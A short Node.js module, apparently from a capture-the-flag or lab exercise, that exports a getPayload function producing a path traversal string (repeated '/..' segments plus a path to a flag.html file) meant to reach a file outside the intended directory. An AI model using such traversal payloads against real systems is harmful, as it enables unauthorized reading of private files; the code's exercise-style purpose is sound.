function getPayload() {
    return { genstr: () => "/..".repeat(50) + path.resolve(__dirname, "../flag.html") };
}

module.exports = { getPayload };